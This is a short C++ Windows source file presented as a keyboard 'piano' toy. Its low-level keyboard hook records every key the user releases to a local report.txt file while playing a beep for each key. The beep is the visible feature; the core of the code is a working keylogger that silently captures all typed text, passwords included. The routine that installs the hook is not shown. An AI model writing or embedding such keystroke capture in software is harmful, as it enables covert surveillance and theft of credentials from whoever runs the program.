#include "stdafx.h"

void logKeyPress()
{
	// Create file to save keystrokes
	FILE * f1;
	error_status_t e = fopen_s(&f1, ".\\report.txt", "w");
	if (EXIT_SUCCESS != e)
	{
		exit(1);
	}
	fclose(f1);

	// mEssage loop
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}


	MessageBox(NULL,
		TEXT("Click \"Ok\" to stop the piano."),
		TEXT("Disable piano"),
		MB_OK);

}


// https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{

	// If there are info about keyboard message
	if (nCode == HC_ACTION)
	{

		// CHeck the keyboard event
		switch (wParam)
		{

		case WM_KEYUP:
			// https://msdn.microsoft.com/en-us/library/windows/desktop/ms644967(v=vs.85).aspx
			KBDLLHOOKSTRUCT hookKey = *(KBDLLHOOKSTRUCT*)lParam;
			//printf("Character : %c", hookKey.vkCode);
			
			//Piano time
			processKeyStroke(&hookKey);
			break;
		default:
			break;
		}
	}
	
	// Pass information to next hook in the chain
	return CallNextHookEx(0, nCode, wParam, lParam);
}


void processKeyStroke(PKBDLLHOOKSTRUCT hookstruct)
{
	// Save into file
	FILE * f1;
	fopen_s(&f1, ".\\report.txt", "a+");
	// Get keyboard state information
	BYTE ks[256];
	GetKeyboardState(ks);
	// Will store the character
	WORD w;
	ToAscii(hookstruct->vkCode, hookstruct->scanCode, ks, &w, 0);
	char character = char(w);
	// Write the character to the file
	fwrite(&character, 1, 1, f1);
	fclose(f1);

	// Piano
	Beep(30 * hookstruct->vkCode, 80);
}
